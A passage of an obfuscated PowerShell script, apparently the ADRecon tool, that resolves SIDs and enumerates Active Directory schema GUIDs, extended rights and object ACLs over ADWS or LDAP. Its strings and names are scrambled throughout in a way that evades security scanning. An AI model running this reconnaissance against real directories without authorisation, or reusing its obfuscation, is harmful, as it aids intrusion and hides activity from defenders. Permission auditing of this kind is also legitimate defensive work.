                    ("{0}{2}{1}" -f 'S-','6','1-5-')       { ("{0}{1}{2}" -f'Se','r','vice') }
                    ("{0}{1}"-f'S-1-','5-7')       { ("{0}{1}"-f 'A','nonymous') }
                    ("{0}{1}" -f 'S-1-5','-8')       { ("{1}{0}"-f'oxy','Pr') }
                    ("{0}{1}{2}"-f 'S-','1-','5-9')       { ("{3}{8}{7}{4}{6}{1}{5}{2}{0}"-f'ers','e Doma','roll','Ente','r','in Cont','is','p','r') }
                    ("{0}{1}{2}" -f'S-1-','5-','10')      { ("{0}{1}{2}{3}" -f 'Pri','ncip','al Sel','f') }
                    ("{1}{0}{2}"-f '1-5-','S-','11')      { ("{0}{2}{3}{1}{4}" -f'A','nticated U','u','the','sers') }
                    ("{1}{0}{2}"-f'1','S-1-5-','2')      { ("{2}{1}{0}" -f 'e',' Cod','Restricted') }
                    ("{0}{2}{1}"-f'S-1','13','-5-')      { ("{1}{4}{0}{3}{2}{5}"-f'r','T','Ser','minal ','e','ver Users') }
                    ("{2}{1}{0}" -f'14','-1-5-','S')      { ("{5}{0}{2}{3}{6}{4}{1}"-f'ote I','n','n','tera','go','Rem','ctive Lo') }
                    ("{2}{0}{1}"-f'1','5','S-1-5-')      { ("{3}{1}{2}{0}"-f'n ','i','s Organizatio','Th') }
                    ("{0}{2}{1}" -f'S-1-','17','5-')      { ("{2}{3}{0}{1}"-f 'gan','ization ','Th','is Or') }
                    ("{1}{0}"-f'-5-18','S-1')      { ("{2}{0}{1}"-f'Syst','em','Local ') }
                    ("{1}{0}"-f '9','S-1-5-1')      { ("{2}{1}{0}" -f 'ity','Author','NT ') }
                    ("{2}{0}{1}" -f '1-5','-20','S-')      { ("{1}{0}{2}"-f 'th','NT Au','ority') }
                    ("{1}{0}{2}"-f '1','S-','-5-80-0')    { ("{2}{1}{0}" -f'ices ','erv','All S') }
                    ("{2}{3}{0}{1}"-f '-3','2-544','S-1','-5')  { ((("{4}{2}{3}{1}{0}" -f 'rs','dministrato','ILT','INsBqA','BU'))."rep`LACE"(([chAR]115+[chAR]66+[chAR]113),[sTRIng][chAR]92)) }
                    ("{3}{1}{2}{0}"-f'-545','-3','2','S-1-5')  { ((("{4}{1}{3}{0}{2}"-f '0}U','ILTI','sers','N{','BU')) -f  [char]92) }
                    ("{0}{3}{2}{1}" -f'S-1-5','6','4','-32-5')  { ((("{3}{1}{2}{0}"-f 'ts','L','TIN{0}Gues','BUI'))-f  [chAR]92) }
                    ("{2}{1}{0}"-f'7','4','S-1-5-32-5')  { ((("{3}{2}{0}{1}{5}{4}" -f'TI','N{','L','BUI','ower Users','0}P'))-f [CHar]92) }
                    ("{1}{0}{2}{3}"-f'2','S-1-5-3','-5','48')  { ((("{4}{3}{6}{1}{7}{2}{5}{0}"-f 'rators','{0','ccou','ILT','BU','nt Ope','IN','}A'))  -F  [CHaR]92) }
                    ("{2}{1}{0}"-f '2-549','-5-3','S-1')  { ((("{5}{2}{3}{6}{0}{4}{1}" -f 'erat','s','IN{0','}Server ','or','BUILT','Op'))-F [CHar]92) }
                    ("{1}{0}{3}{2}" -f '3','S-1-5-','0','2-55')  { ((("{5}{4}{1}{3}{2}{0}"-f 'perators','IL','RPrint O','TINOc','U','B'))."R`e`plACe"(([cHaR]79+[cHaR]99+[cHaR]82),[STRiNg][cHaR]92)) }
                    ("{2}{1}{0}" -f'551','-1-5-32-','S')  { ((("{2}{1}{3}{4}{0}{5}" -f'up Oper','UILTINcpW','B','Ba','ck','ators'))  -RePLAcE ([chAR]99+[chAR]112+[chAR]87),[chAR]92) }
                    ("{2}{0}{1}{3}" -f '1','-','S-','5-32-552')  { ((("{1}{5}{2}{0}{3}{4}"-f'epli','BUILT','dKuR','c','ators','IN'))  -rEpLACE([cHaR]100+[cHaR]75+[cHaR]117),[cHaR]92) }
                    ("{2}{1}{3}{0}"-f'4','-1-5-32','S','-55')  { ((("{7}{5}{2}{8}{10}{6}{1}{9}{0}{4}{3}"-f 'ib','p','NLma',' Access','le','UILTI','0 Com','B','Pre-W','at','indows 200')) -REPLACe'Lma',[ChaR]92) }
                    ("{0}{3}{2}{1}"-f 'S','-555','2','-1-5-3')  { ((("{3}{5}{0}{4}{2}{1}"-f 'Rem','p Users',' Deskto','BUILTINvd','ote','Q')) -REPLaCe 'vdQ',[cHaR]92) }
                    ("{2}{1}{0}" -f '56','2-5','S-1-5-3')  { ((("{2}{9}{5}{1}{6}{0}{4}{8}{7}{3}" -f 'ra',' Confi','BUILTIN{0}Net','tors','tio','k','gu','pera','n O','wor'))-F[cHAr]92) }
                    ("{1}{3}{2}{0}" -f'2-557','S-','3','1-5-')  { ((("{5}{1}{9}{0}{6}{4}{2}{8}{7}{3}" -f'comi','ILT',' Trus','ers','t','BU','ng Fores','ld','t Bui','INAFfIn')) -replacE'AFf',[ChAR]92) }
                    ("{2}{1}{0}{3}"-f '1-5-32-','-','S','558')  { ((("{8}{4}{7}{9}{3}{1}{10}{6}{5}{0}{2}"-f 's',' M','ers','rmance','TINX','r U','to','Jn','BUIL','Perfo','oni')) -ReplACe  'XJn',[Char]92) }
                    ("{0}{2}{1}" -f'S-1-','59','5-32-5')  { ((("{0}{8}{4}{2}{7}{5}{1}{6}{3}" -f 'B','Log U','Perf','rs','ILTIN{0}','ance ','se','orm','U'))-f [chAR]92) }
                    ("{2}{1}{0}{3}" -f'-3','1-5','S-','2-560')  { ((("{10}{9}{8}{7}{0}{13}{6}{4}{3}{2}{1}{12}{11}{5}" -f'ut','G','ccess ','ion A','zat','up','ri','7hWindows A','g','LTIN','BUI','o','r','ho'))-CrEPLace  ([CHAR]103+[CHAR]55+[CHAR]104),[CHAR]92) }
                    ("{2}{0}{3}{1}"-f '-1-','-561','S','5-32')  { ((("{5}{0}{7}{4}{1}{2}{3}{6}" -f 'U','Terminal S','erver Licens','e S','}','B','ervers','ILTIN{0'))  -F  [ChaR]92) }
                    ("{0}{1}{2}"-f'S-1-5','-32','-562')  { ((("{0}{9}{8}{3}{4}{7}{5}{1}{6}{2}" -f'BU','OM','s','istribut','ed','C',' User',' ','0}D','ILTIN{'))-f[CHAR]92) }
                    ("{0}{2}{1}" -f 'S-1-','2-569','5-3')  { ((("{3}{6}{2}{5}{1}{0}{4}" -f' Oper','c','ap','BUILTIN5NJ','ators','hi','Cryptogr'))."RePL`A`cE"(([cHAr]53+[cHAr]78+[cHAr]74),[STRinG][cHAr]92)) }
                    ("{2}{3}{1}{0}" -f'73','5','S-1-','5-32-')  { ((("{2}{1}{0}{3}{4}" -f 'Log Rea','INHgTEvent ','BUILT','de','rs')) -replace ([ChaR]72+[ChaR]103+[ChaR]84),[ChaR]92) }
                    ("{3}{0}{1}{2}"-f'-5-32-','5','74','S-1')  { ((("{5}{0}{8}{6}{1}{9}{3}{2}{7}{4}" -f'UILTIN{0}Cert','ate Serv','COM A','D','ess','B','c','cc','ifi','ice '))  -F [cHar]92) }
                    ("{2}{3}{1}{0}"-f'575','32-','S-1-','5-')  { ((("{0}{5}{2}{3}{4}{1}" -f'BU','cess Servers','LTIN{0}RDS Rem','ote',' Ac','I')) -f [Char]92) }
                    ("{2}{1}{0}"-f '76','-5-32-5','S-1')  { ((("{1}{3}{2}{5}{6}{8}{7}{4}{0}"-f 's','BUILTI','S','N7',' Server','ZRD','S Endp','int','o'))."r`EPla`Ce"(([cHAR]55+[cHAR]83+[cHAR]90),[StRIng][cHAR]92)) }
                    ("{1}{2}{3}{0}"-f '5-32-577','S','-1','-')  { ((("{6}{5}{1}{4}{8}{7}{0}{2}{3}"-f' ','ILTIN','Server','s','{0}RDS ','U','B','agement','Man')) -F[chAr]92) }
                    ("{2}{1}{0}" -f'78','5','S-1-5-32-')  { ((("{3}{0}{4}{1}{5}{2}{6}" -f'ILT','dmini','trat','BU','IN{0}Hyper-V A','s','ors'))  -f [chAr]92) }
                    ("{0}{2}{1}"-f 'S-1-','79','5-32-5')  { ((("{5}{9}{10}{7}{0}{3}{2}{12}{4}{6}{8}{11}{1}"-f 'Contro','rs','Assi','l ','ance Oper','B','a','ess ','t','UILTIN5ZOAc','c','o','st'))  -rEPlace  ([cHAR]53+[cHAR]90+[cHAR]79),[cHAR]92) }
                    ("{2}{0}{1}{3}" -f '32-','5','S-1-5-','80')  { ((("{5}{1}{0}{3}{4}{2}" -f'an','N{0}Remote M','ers','agem','ent Us','BUILTI'))  -F[ChAr]92) }
                    Default {
                        
                        If ( ($TargetSid -match ("{1}{0}{2}" -f'-','^S','1-.*')) -and ($ResolveSID) )
                        {
                            If ($Method -eq ("{1}{0}"-f 'WS','AD'))
                            {
                                Try
                                {
                                    $ADObject = Get-ADObject -Filter ('ob'+'je'+'ctSid '+'-eq'+' '+"'$TargetSid'") -Properties DistinguishedName,sAMAccountName
                                }
                                Catch
                                {
                                    Write-Warning ("{9}{7}{11}{3}{6}{2}{0}{12}{10}{13}{5}{8}{1}{4}" -f'le e',' us',' whi','ID] E','ing SID','b','rror','nvertFr','ject','[Co','me','om-S','nu','rating O')
                                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                                }
                                If ($ADObject)
                                {
                                    $UserDomain = Get-DNtoFQDN -ADObjectDN $ADObject."d`iStInGUIShe`D`NAmE"
                                    $ADSOutput = $UserDomain + "\" + $ADObject."SA`MA`cc`OUNTNamE"
                                    Remove-Variable UserDomain
                                }
                            }

                            If ($Method -eq ("{0}{1}" -f'LDA','P'))
                            {
                                If ($Credential -ne   ( vaRiABLE  q3CUvm  -vALuEoNLy  )::"E`mptY")
                                {
                                    $ADObject = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainFQDN/<SID=$TargetSid>",($Credential.("{3}{2}{1}{0}" -f'redential','NetworkC','t','Ge').Invoke())."USERN`A`mE",($Credential.("{3}{1}{0}{2}"-f'workCre','etNet','dential','G').Invoke())."P`A`ssWOrd")
                                }
                                Else
                                {
                                    $ADObject = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainFQDN/<SID=$TargetSid>")
                                }
                                If ($ADObject)
                                {
                                    If (-Not ( (gi  varIaBlE:A4EyzP ).valUe::("{3}{1}{2}{0}" -f'ty','llOrE','mp','IsNu').Invoke($ADObject."PRO`PE`RT`ieS"."SA`M`AC`C`ountnAME")) )
                                    {
                                        $UserDomain = Get-DNtoFQDN -ADObjectDN $([string] ($ADObject."PrOPer`T`ieS"."DISti`N`g`Ui`sHeDn`AMe"))
                                        $ADSOutput = $UserDomain + "\" + $([string] ($ADObject."Pr`op`eRT`ieS"."S`AmacCOU`Ntn`A`me"))
                                        Remove-Variable UserDomain
                                    }
                                }
                            }

                            If ( (-Not $ADSOutput) -or ( ( ChIlDITeM VARIabLE:a4eyZP).ValUe::("{3}{0}{1}{2}"-f 'O','rEmp','ty','IsNull').Invoke($ADSOutput)) )
                            {
                                $ADSOutputType = $ADS_NAME_TYPE_NT4
                                $Init = $true
                                $Translate = New-Object -ComObject NameTranslate
                                If ($Credential -ne  (dIR  VariaBlE:Q3cuvM  ).vaLue::"EMP`Ty")
                                {
                                    $ADSInitType = $ADS_NAME_INITTYPE_DOMAIN
                                    Try
                                    {
                                          ( Ls ("Vari"+"AB"+"l"+"e:4gQu") ).valuE.("{1}{0}{2}" -f'eM','Invok','ember').Invoke(("{0}{1}" -f'In','itEx'),("{1}{0}{2}" -f'e','InvokeM','thod'),$null,$Translate,$(@($ADSInitType,$DomainFQDN,($Credential.("{2}{0}{4}{1}{3}"-f 'etNe','edent','G','ial','tworkCr').Invoke())."U`Sername",$DomainFQDN,($Credential.("{1}{2}{4}{5}{3}{0}"-f 'dential','Get','Ne','Cre','twor','k').Invoke())."P`A`SSwORd")))
                                    }
                                    Catch
                                    {
                                        $Init = $false
                                        
                                        
                                    }
                                }
                                Else
                                {
                                    $ADSInitType = $ADS_NAME_INITTYPE_GC
                                    Try
                                    {
                                          $4gQU.("{1}{2}{0}{3}"-f 'Me','Inv','oke','mber').Invoke(("{1}{0}" -f't','Ini'),("{2}{1}{0}" -f 'eMethod','nvok','I'),$null,$Translate,($ADSInitType,$null))
                                    }
                                    Catch
                                    {
                                        $Init = $false
                                        
                                        
                                    }
                                }
                                If ($Init)
                                {
                                      ( vARIAblE ("4GQ"+"u") -VAlU  ).("{2}{1}{0}" -f'keMember','vo','In').Invoke(("{1}{2}{3}{0}" -f 'erral','Ch','as','eRef'),("{2}{1}{0}" -f 'ty','oper','SetPr'),$null,$Translate,$ADS_CHASE_REFERRALS_ALWAYS)
                                    Try
                                    {
                                          ( VaRiable 4gQU  -value ).("{2}{3}{1}{0}"-f 'r','embe','I','nvokeM').Invoke("Set",("{0}{3}{2}{1}"-f 'Inv','thod','e','okeM'),$null,$Translate,($ADS_NAME_TYPE_UNKNOWN, $TargetSID))
                                        $ADSOutput =  $4gQU.("{0}{2}{1}"-f 'I','keMember','nvo').Invoke("Get",("{1}{2}{0}"-f'hod','In','vokeMet'),$null,$Translate,$ADSOutputType)
                                    }
                                    Catch
                                    {
                                        
                                        
                                    }
                                }
                            }
                        }
                        If (-Not (  (  diR  ('VARiAB'+'le:a'+'4eYZ'+'p')  ).VAlue::("{1}{0}{2}{3}" -f 'll','IsNu','OrE','mpty').Invoke($ADSOutput)) )
                        {
                            Return $ADSOutput
                        }
                        Else
                        {
                            Return $TargetSid
                        }
                    }
                }
            }
            Catch
            {
                
                
            }
        }
        Else
        {
            Return $TargetSid
        }
    }
}


Function Get-ADRACL
{

    param(
        [Parameter(MAnDatoRy = $true)]
        [string] $Method,

        [Parameter(mAnDaTOrY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(MANDaToRY = $false)]
        [string] $DomainController,

        [Parameter(MAnDaTORY = $false)]
        [Management.Automation.PSCredential] $Credential =  (GCi  VaRiaBLe:Q3CUvM  ).VaLUe::"e`MPTY",

        [Parameter(mAndAToRy = $false)]
        [bool] $ResolveSID = $false,

        [Parameter(MaNdATory = $true)]
        [int] $PageSize,

        [Parameter(maNdatOry = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ("{1}{0}"-f 'DWS','A'))
    {
        If ($Credential -eq  $q3cuVm::"e`mptY")
        {
            If (Test-Path AD:)
            {
                Set-Location AD:
            }
            Else
            {
                Write-Warning ("{1}{0}{7}{12}{2}{11}{9}{8}{10}{4}{6}{3}{5}"-f'ef','D','ive n',' enumerati','AC','on','L','ault AD d','ppi','i','ng ','ot found ... Sk','r')
                Return $null
            }
        }
        $GUIDs = @{("{9}{1}{4}{8}{10}{6}{3}{7}{0}{5}{2}"-f'0000','00','0000','0','00000-','00','00','0-00','0000-0000','0','-') = 'All'}
        Try
        {
            Write-Verbose ("{0}{5}{4}{3}{2}{1}{6}"-f '[*] E','aI','schem','ting ','umera','n','Ds')
            $schemaIDs = Get-ADObject -SearchBase (Get-ADRootDSE)."sCH`ema`NA`minG`CO`Nt`eXt" -LDAPFilter (("{1}{2}{0}"-f'aIDGUID=*)','(s','chem')) -Properties name, schemaIDGUID
        }
        Catch
        {
            Write-Warning ("{1}{3}{4}{11}{5}{0}{9}{8}{2}{7}{10}{12}{6}"-f'o','[Get','merati','-A','D','r','hemaIDs','n','u','r while en','g','RACL] Er',' sc')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }

        If ($schemaIDs)
        {
            $schemaIDs | Where-Object {$_} | ForEach-Object {
                
                $GUIDs[(New-Object Guid (,$_."s`cHeMA`id`GUID"))."g`UiD"] = $_."na`mE"
            }
            Remove-Variable schemaIDs
        }

        Try
        {
            Write-Verbose ("{1}{5}{9}{2}{3}{8}{0}{4}{6}{7}"-f 'tor','[','ng Active Dir','e','y','*] ',' Ri','ghts','c','Enumerati')
            $schemaIDs = Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter ("{1}{0}{4}{5}{6}{7}{2}{3}{8}" -f 'tClas','(objec','igh','t','s','=contro','lAcce','ssR',')') -Properties name, rightsGUID
        }
        Catch
        {
            Write-Warning ("{4}{9}{6}{10}{0}{2}{7}{8}{5}{1}{3}{12}{11}"-f 'rro','erating Act','r','ive ','[Ge','num','-ADR',' w','hile e','t','ACL] E','ghts','Directory Ri')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }

        If ($schemaIDs)
        {
            $schemaIDs | Where-Object {$_} | ForEach-Object {
                
                $GUIDs[(New-Object Guid (,$_."Ri`g`HtsguiD"))."gu`Id"] = $_."n`AmE"
            }
            Remove-Variable schemaIDs
        }

        
        $Objs = @()
        Try
        {
            $ADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning ("{0}{1}{7}{2}{3}{9}{5}{6}{8}{4}"-f'[G','et','L] Er','ror gett','ext','Domai','n Con','-ADRAC','t','ing ')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }

        Try
        {
            Write-Verbose ("{3}{11}{10}{14}{8}{6}{9}{12}{15}{2}{7}{0}{13}{16}{1}{4}{5}" -f'pu','d','C','[*]',' Gro','up Objects','n','om','ai',', OU','at',' Enumer',', GPO','te','ing Dom',', User, ','r an')
            $Objs += Get-ADObject -LDAPFilter ((("{4}{43}{18}{29}{21}{3}{34}{12}{45}{52}{1}{13}{46}{0}{24}{2}{7}{44}{48}{9}{8}{20}{54}{26}{15}{36}{32}{40}{27}{57}{14}{28}{47}{50}{49}{19}{22}{33}{16}{10}{23}{58}{35}{51}{42}{30}{37}{25}{39}{55}{41}{53}{5}{6}{38}{17}{11}{56}{31}"-f'upPol','ctCategor','er)(samA','a','(h8J(obj',')(sama','c','ccountT','samAc','6368)(','4','ttype=5368','ation','y','a','=80','ounttype=268','un','ject','26','coun','org','8435456)(sam','354','icyContain','coun','Type','3','m','Category=','a','0913))','30','acc','niz',')','5','mac','co','ttyp','6','3687','s','ectClass=domain)(ob','ype=8','alunit','=gro','a','0530','counttype=','c','(',')(obje','0912','t','e=5','7','69)(s','57'))."re`p`lacE"(([cHaR]104+[cHaR]56+[cHaR]74),[sTRiNg][cHaR]124)) -Properties DisplayName, DistinguishedName, Name, ntsecuritydescriptor, ObjectClass, objectsid
        }
        Catch
        {
            Write-Warning ("{24}{15}{14}{0}{18}{13}{23}{7}{6}{19}{21}{9}{16}{20}{25}{1}{17}{5}{12}{8}{2}{22}{10}{4}{11}{3}"-f 'L]','mputer ','u','s','bjec','d G','Domain, OU, G','ng ','o','Us',' O','t','r',' while enumerat','AC','et-ADR','e','an',' Error','PO','r',', ','p','i','[G',', Co')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }

        If ($ADDomain)
        {
            Try
            {
                Write-Verbose ("{4}{0}{6}{5}{2}{1}{3}"-f'*] En','Objec',' ','ts','[','ting Root Container','umera')
                $Objs += Get-ADObject -SearchBase $($ADDomain."dIst`inguis`heD`NaMe") -SearchScope OneLevel -LDAPFilter (("{3}{2}{0}{4}{5}{1}" -f'j','ntainer)','b','(o','ectCla','ss=co')) -Properties DistinguishedName, Name, ntsecuritydescriptor, ObjectClass
            }
            Catch
            {
                Write-Warning ("{3}{12}{13}{10}{4}{5}{6}{9}{1}{0}{8}{2}{14}{11}{7}" -f 'g R','numeratin','ot Contai','[Get-',' Err','o','r whi','ects','o','le e','L]','bj','A','DRAC','ner O')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
        }

        If ($Objs)
        {
            $ACLObj = @()
            Write-Verbose "[*] Total Objects: $([ADRecon.ADWSClass]::ObjectCount($Objs)) "
            Write-Verbose ("{2}{3}{0}{1}" -f 'C','Ls','[-] ','DA')
            $DACLObj =  (Item ("va"+"rIa"+"BLe:obR")).VaLuE::("{3}{0}{1}{2}" -f 'AC','LPars','er','D').Invoke($Objs, $GUIDs, $Threads)
            
            Write-Warning ("{1}{8}{7}{0}{6}{10}{2}{5}{4}{3}{9}"-f 'odule ','[*] SA','sup','A',' with LD','ported','is only',' the m','CLs - Currently,','P.',' ')
            
            Remove-Variable Objs
            Remove-Variable GUIDs
        }
    }

    If ($Method -eq ("{1}{0}"-f 'DAP','L'))
    {
        $GUIDs = @{("{3}{0}{1}{2}{4}{9}{7}{8}{10}{6}{5}"-f '00','0','-','00000000-0','0000','00','0','0','00','-0000-00000','0') = 'All'}

        If ($Credential -ne   $Q3cUvm::"E`MPtY")
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain."DI`St`inGU`I`sHE`dnaME")
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(("{0}{1}"-f 'Domai','n'),$($DomainFQDN),$($Credential."uS`E`RnamE"),$($Credential.("{0}{3}{4}{1}{2}"-f'Ge','denti','al','tNet','workCre').Invoke()."PaSSw`Ord"))
            Try
            {
                $ADDomain =  (  get-vaRIable ('wM3'+'5')).VaLUE::("{1}{0}{2}" -f'tD','Ge','omain').Invoke($DomainContext)
            }
            Catch
            {
                Write-Warning ("{6}{8}{1}{2}{3}{4}{5}{7}{0}{9}"-f'ntex','] Error',' g','ett','ing ','D','[Get-ADRA','omain Co','CL','t')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }

            Try
            {
                $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(("{0}{1}"-f'Fore','st'),$($ADDomain."f`OrEST"),$($Credential."uS`eR`NaME"),$($Credential.("{4}{0}{2}{3}{5}{1}"-f'two','l','rkCr','edenti','GetNe','a').Invoke()."pASSWO`Rd"))
                $ADForest =  (  DIR ('va'+'rIABl'+'e:Kwx9e') ).VAlue::("{0}{1}"-f 'GetFore','st').Invoke($ForestContext)
                $SchemaPath = $ADForest."sc`HEMa"."na`me"
                Remove-Variable ADForest
            }
            Catch
            {
                Write-Warning ("{5}{6}{2}{3}{7}{8}{10}{0}{4}{9}{1}" -f 'h','th','ADRACL] Error e','n','emaP','[Ge','t-','umer','ating ','a','Sc')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
        }
        Else
        {
            $ADDomain =   ( geT-VARIaBlE  wm35 -vAlueON )::("{1}{0}{2}" -f'tCu','Ge','rrentDomain').Invoke()
            $ADForest =  $kwX9e::("{1}{0}{2}{3}"-f 'ntFo','GetCurre','r','est').Invoke()
            $SchemaPath = $ADForest."sc`h`eMa"."nA`me"
            Remove-Variable ADForest
        }

        If ($SchemaPath)
        {
            Write-Verbose ("{0}{4}{2}{3}{1}"-f '[','erating schemaIDs','] Enu','m','*')
            If ($Credential -ne  (chILdITEm  ('vArIAb'+'Le:q'+'3'+'CUVm') ).valuE::"E`mPTy")
            {
                $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($SchemaPath)", $Credential."UsE`RNA`ME",$Credential.("{1}{0}{2}{4}{3}"-f'or','GetNetw','kCrede','al','nti').Invoke()."pas`S`woRD"
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
            }
            Else
            {
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher ([ADSI] "LDAP://$($SchemaPath)")
            }
            $objSearcherPath."P`AGE`SiZE" = $PageSize
            $objSearcherPath."fIl`Ter" = ("{1}{3}{0}{4}{2}"-f 'I','(sc',')','hemaIDGU','D=*')

            Try
            {
                $SchemaSearcher = $objSearcherPath.("{0}{1}{2}" -f'Fi','nd','All').Invoke()
            }
            Catch
            {
                Write-Warning ("{7}{6}{8}{1}{5}{4}{2}{3}{0}{10}{9}{11}"-f'g S','C','umera','tin','ror en','L] Er','Ge','[','t-ADRA','m','che','aIDs')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }

            If ($SchemaSearcher)
            {
                $SchemaSearcher | Where-Object {$_} | ForEach-Object {
                    
                    $GUIDs[(New-Object Guid (,$_."PR`Oper`T`ieS"."sCheMa`i`Dg`UiD"[0]))."Gu`ID"] = $_."pROPE`Rt`IeS"."na`ME"[0]
                }
                $SchemaSearcher.("{1}{0}"-f'pose','dis').Invoke()
            }
            $objSearcherPath.("{0}{2}{1}" -f 'dis','e','pos').Invoke()

            Write-Verbose ("{8}{9}{2}{4}{6}{1}{7}{0}{3}{5}"-f 'o','ire','Activ','ry Rig','e ','hts','D','ct','[*] Enumerat','ing ')
            If ($Credential -ne  (  VaRiAblE ("q3"+"cuVM") -Valu)::"eM`pTy")
            {
                $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry (("LDAP://$($DomainController)/$($SchemaPath.replace("Schema","Extended-Rights"))")), $Credential."UsER`Name",$Credential.("{5}{2}{0}{3}{4}{1}"-f't','ntial','e','workC','rede','GetN').Invoke()."pas`s`wOrd"
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
            }
            Else
            {
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher ([ADSI] (("LDAP://$($SchemaPath.replace("Schema","Extended-Rights"))")))
            }
            $objSearcherPath."pa`gEsi`zE" = $PageSize
            $objSearcherPath."fI`lTER" = (("{3}{5}{6}{9}{1}{7}{8}{2}{4}{0}"-f ')','ntrolA','ssR','(o','ight','bject','Class=','cc','e','co'))

            Try
            {
                $RightsSearcher = $objSearcherPath.("{0}{2}{1}" -f'F','All','ind').Invoke()
            }
            Catch
            {
                Write-Warning ("{1}{3}{6}{5}{7}{0}{2}{8}{4}"-f 'e Directo','[Get-ADRACL] Error e','r','n','s','ing Ac','umerat','tiv','y Right')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }

            If ($RightsSearcher)
            {
                $RightsSearcher | Where-Object {$_} | ForEach-Object {
                    
                    $GUIDs[$_."pRO`P`ErTies"."R`iG`HtsGuID"[0].("{2}{1}{0}" -f 'ring','t','toS').Invoke()] = $_."P`R`opERtI`eS"."NA`mE"[0]
                }
                $RightsSearcher.("{0}{1}"-f'dis','pose').Invoke()
            }
            $objSearcherPath.("{0}{1}" -f 'dispos','e').Invoke()
        }

        
        $Objs = @()
        Write-Verbose ("{10}{8}{7}{9}{6}{4}{1}{5}{3}{0}{2}" -f' Group O','ser,','bjects','mputer and',' U',' Co',', GPO,','ting Domai','] Enumera','n, OU','[*')
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher."paGEsi`Ze" = $PageSize
        $ObjSearcher."FILT`er" = ((("{4}{24}{18}{38}{20}{52}{0}{55}{39}{15}{32}{26}{44}{29}{46}{41}{27}{13}{40}{6}{5}{17}{19}{43}{3}{21}{49}{35}{53}{51}{7}{9}{12}{1}{30}{2}{37}{23}{50}{22}{10}{25}{48}{16}{31}{14}{45}{36}{54}{28}{33}{47}{34}{11}{8}{42}"-f'ect','8053','36',')(samAccou','(yWE(obj','oupPoli','y=gr','68)','09','(samAccou','type','687','ntType=','c','ntt','g','am','cy','Cla','Co',')(o','ntT','count',')(sam','ect','=26843','y=','e','536870912)','rg','06','accou','or','(samacco','53','e','ccou','9','ss=domain','te','tCategor','tionalunit)(obj','13))','ntainer','o','ype=268435457)(sama','aniza','unttype=','5456)(s','yp','ac','3063','bj','=805','nttype=','Ca'))."r`EplaCE"('yWE',[StrINg][ChAR]124))
        
        $ObjSearcher."SEcUr`ity`MAs`KS" =  (gEt-ITEm ("v"+"ariabLe"+":58a"+"7z")  ).VaLue::"da`cL" -bor  (  varIAble 58A7z).ValuE::"gr`Oup" -bor   $58A7Z::"OWn`ER" -bor  (get-VarIAble  ('58'+'A7Z')  -ValUe )::"s`ACL"
        $ObjSearcher."prop`E`RtIESto`l`OaD".("{1}{2}{0}" -f 'e','Add','Rang').Invoke((("{0}{2}{1}{3}"-f 'displa','am','yn','e'),("{3}{2}{1}{4}{0}"-f 'name','guishe','tin','dis','d'),("{0}{1}" -f 'nam','e'),("{4}{2}{1}{0}{3}"-f 'itydes','cur','se','criptor','nt'),("{3}{2}{0}{1}"-f 't','class','jec','ob'),("{2}{1}{0}" -f 'ectsid','j','ob')))
        $ObjSearcher."SEARcHs`co`Pe" = ("{0}{1}" -f 'Subtre','e')

        Try
        {
            $Objs += $ObjSearcher.("{2}{1}{0}" -f'dAll','in','F').Invoke()
        }
        Catch
        {
            Write-Warning ("{15}{11}{12}{1}{0}{21}{17}{22}{5}{6}{19}{10}{3}{20}{7}{8}{16}{14}{9}{2}{18}{13}{4}" -f 'l','whi','roup O','se','ts','ng Domai','n, O',', Com','pute','G','PO, U','RACL] Erro','r ','c','nd ','[Get-AD','r a',' en','bje','U, G','r','e','umerati')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        $ObjSearcher.("{1}{2}{0}" -f 'ose','d','isp').Invoke()

        Write-Verbose ("{4}{7}{3}{6}{0}{2}{1}{5}"-f'onta','Obje','iner ','Enumerating','[','cts',' Root C','*] ')
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher."paG`ESiZE" = $PageSize
        $ObjSearcher."fiL`Ter" = (("{3}{2}{4}{0}{5}{1}" -f'tClass=containe',')','b','(o','jec','r'))
        
        $ObjSearcher."seC`Uritym`As`Ks" = $ObjSearcher."seCuRi`TyMA`s`ks" =   $58A7z::"d`Acl" -bor   $58a7z::"Gr`OuP" -bor  (  GI ('v'+'aRIAb'+'LE:5'+'8A7'+'z')  ).vAluE::"OWn`ER" -bor   (VaRIABle  58a7Z  ).Value::"Sa`CL"
        $ObjSearcher."ProP`ER`TiesTOL`o`AD".("{0}{1}{2}"-f 'Add','Ra','nge').Invoke((("{0}{2}{1}{3}{4}"-f 'distin','sh','gui','ednam','e'),("{0}{1}"-f'na','me'),("{2}{1}{3}{0}" -f 'descriptor','i','ntsecur','ty'),("{0}{3}{2}{1}"-f 'obj','ss','a','ectcl')))
        $ObjSearcher."SEa`RCh`sCOPE" = ("{2}{0}{1}"-f'e','Level','On')

        Try
        {
            $Objs += $ObjSearcher.("{1}{0}"-f'indAll','F').Invoke()
